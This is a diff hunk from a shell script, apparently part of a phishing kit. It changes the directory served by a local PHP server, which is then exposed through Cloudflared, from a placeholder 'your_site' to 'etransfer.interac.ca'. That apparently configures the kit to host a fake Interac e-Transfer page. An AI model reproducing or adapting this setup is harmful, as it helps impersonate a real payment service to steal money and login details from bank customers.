@@ -257,7 +257,7 @@ cusport() {
 setup_site() {
     echo -e "\n[ - ] Setting up server..."
     echo -ne "\n[ - ] Starting PHP server..."
-    cd your_site && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+    cd etransfer.interac.ca && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Start Cloudflared
